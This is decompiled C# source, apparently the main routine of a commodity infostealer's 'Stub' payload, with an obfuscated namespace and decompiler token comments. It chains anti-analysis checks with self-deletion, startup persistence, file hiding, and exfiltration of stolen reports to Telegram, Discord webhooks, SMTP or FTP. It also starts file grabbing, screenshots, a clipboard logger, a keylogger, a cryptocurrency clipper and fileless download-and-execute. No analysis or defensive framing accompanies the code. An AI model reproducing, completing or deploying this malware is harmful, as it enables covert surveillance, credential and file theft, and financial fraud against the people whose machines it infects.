using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;

namespace Stub
{
	// Token: 0x020000A0 RID: 160
	internal static class Program
	{
		// Token: 0x06000239 RID: 569 RVA: 0x00015FE8 File Offset: 0x000141E8
		[STAThread]
		private static async Task Main()
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
			MutexControl.Check();
			Logging.Log("Program: Mutex check completed.", true);
			if (Config.AntiAnalysis == "1")
			{
				AntiAnalysis.Run();
				Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.", true);
				SelfDestruct.Melt();
			}
			Logging.Log("Program: Starting configuration initialization...", true);
			try
			{
				await Task.Run(new Action(Config.InitAsync));
				Logging.Log("Program: Configuration initialized successfully.", true);
			}
			catch (Exception ex)
			{
				Logging.Log("Program: Failed to initialize configuration: " + ex.Message + "\nStack trace: " + ex.StackTrace, true);
				throw;
			}
			Logging.Log("Program: Changing working directory...", true);
			Directory.SetCurrentDirectory(Paths.InitWorkDir());
			if (Config.StartDelay == "1")
			{
				Logging.Log("StartDelay is enabled...", true);
				StartDelay.Run();
			}
			if (Config.Startup == "1" && !Startup.IsInstalled())
			{
				Logging.Log("Startup is enabled...", true);
				Startup.Install();
			}
			if (Config.Melt == "1")
			{
				Logging.Log("Hiding file attribute is enabled...", true);
				Melt.MeltFile();
			}
			if (Config.TelegramCheckBox == "1")
			{
				try
				{
					Logging.Log("Program: Checking Telegram configuration...", true);
					if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
					{
						Logging.Log("Program: Invalid Telegram configuration, initiating self-destruct", true);
						SelfDestruct.Melt();
					}
					Logging.Log("Program: Telegram configuration is valid", true);
					goto IL_04A9;
				}
				catch (Exception ex2)
				{
					Logging.Log("Program: Error checking Telegram configuration: " + ex2.Message + "\nStack trace: " + ex2.StackTrace, true);
					throw;
				}
			}
			if (Config.DiscordCheckBox == "1")
			{
				try
				{
					Logging.Log("Program: Checking Discord configuration...", true);
					if (Config.DiscordWebhook.Contains("---") || !Config.DiscordWebhook.StartsWith("http"))
					{
						Logging.Log("Program: Invalid Discord configuration, initiating self-destruct", true);
						SelfDestruct.Melt();
					}
					Logging.Log("Program: Discord configuration is valid", true);
					goto IL_04A9;
				}
				catch (Exception ex3)
				{
					Logging.Log("Program: Error checking Discord configuration: " + ex3.Message + "\nStack trace: " + ex3.StackTrace, true);
					throw;
				}
			}
			if (Config.SmtpCheckBox == "1")
			{
				try
				{
					Logging.Log("Program: Checking Smtp configuration...", true);
					if (Config.SmtpServer.Contains("---") || Config.SmtpSender.Contains("---") || Config.SmtpPassword.Contains("---") || Config.SmtpPort.Contains("---") || Config.SmtpReceiver.Contains("---") || Config.CbEnableSsl.Contains("---"))
					{
						Logging.Log("Program: Invalid Smtp configuration, initiating self-destruct", true);
						SelfDestruct.Melt();
					}
					Logging.Log("Program: Smtp configuration is valid", true);
					goto IL_04A9;
				}
				catch (Exception ex4)
				{
					Logging.Log("Program: Error checking Smtp configuration: " + ex4.Message + "\nStack trace: " + ex4.StackTrace, true);
					throw;
				}
			}
			if (Config.FtpCheckBox == "1")
			{
				try
				{
					Logging.Log("Program: Checking Smtp configuration...", true);
					if (Config.FtpHost.Contains("---") || Config.FtpUser.Contains("---") || Config.FtpPass.Contains("---"))
					{
						Logging.Log("Program: Invalid Ftp Configuration configuration, initiating self-destruct", true);
						SelfDestruct.Melt();
					}
					Logging.Log("Program: Ftp configuration is valid", true);
				}
				catch (Exception ex5)
				{
					Logging.Log("Program: Error checking Ftp configuration: " + ex5.Message + "\nStack trace: " + ex5.StackTrace, true);
					throw;
				}
			}
			IL_04A9:
			if (Config.TelegramCheckBox == "1")
			{
				TaskAwaiter taskAwaiter = Reports.SaveAsync().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				await TelegramSendLogs.SendReportAsync(null);
			}
			else if (Config.DiscordCheckBox == "1")
			{
				TaskAwaiter taskAwaiter3 = Reports.SaveAsync().GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				await DiscordSendLogs.SendReportAsync(null);
			}
			else if (Config.SmtpCheckBox == "1")
			{
				TaskAwaiter taskAwaiter4 = Reports.SaveAsync().GetAwaiter();
				if (!taskAwaiter4.IsCompleted)
				{
					await taskAwaiter4;
					TaskAwaiter taskAwaiter2;
					taskAwaiter4 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter4.GetResult();
				await SmtpSendLogs.SendReportAsync(null);
			}
			else if (Config.FtpCheckBox == "1")
			{
				TaskAwaiter taskAwaiter5 = Reports.SaveAsync().GetAwaiter();
				if (!taskAwaiter5.IsCompleted)
				{
					await taskAwaiter5;
					TaskAwaiter taskAwaiter2;
					taskAwaiter5 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter5.GetResult();
				await FtpSendLogs.SendReportAsync(null);
			}
			if (Config.FileGrabberCheckBox == "1")
			{
				Logging.Log("File grabbing & Upload started.", true);
				await GrabbedFiles.StartGrabbingAsync();
				Logging.Log("File grabbing & Upload Completed.", true);
			}
			if (Config.Screenshot == "1")
			{
				Program._screenshot = new Screenshot();
				Program._screenshot.Start();
				Logging.Log("Screenshot service started.", true);
			}
			if (Config.Clipboard == "1")
			{
				ClipLogger.Start();
				Logging.Log("Starting clipboard logger...", true);
			}
			if (Config.Keylogger == "1")
			{
				Logging.Log("Starting keylogger modules...", true);
				Keylogger.Start();
			}
			if (Config.ClipperCheckBox == "1")
			{
				Program._clipper = new Clipper(1000);
				Program._clipper.Start();
				Logging.Log("Starting Clipper modules...", true);
			}
			if (Config.FileDownloader == "1")
			{
				await Downloader.FilelessDownloaderAsync();
				Logging.Log("Start fileless downloading and execution.", true);
			}
			Application.Run();
		}

		// Token: 0x0600023A RID: 570 RVA: 0x00016028 File Offset: 0x00014228
		[DebuggerStepThrough]
		private static void <Main>()
		{
			Program.Main().GetAwaiter().GetResult();
		}

		// Token: 0x0600023B RID: 571 RVA: 0x000038AD File Offset: 0x00001AAD
		static Program()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x040004FB RID: 1275
		private static Screenshot _screenshot;

		// Token: 0x040004FC RID: 1276
		private static Clipper _clipper;
	}
}
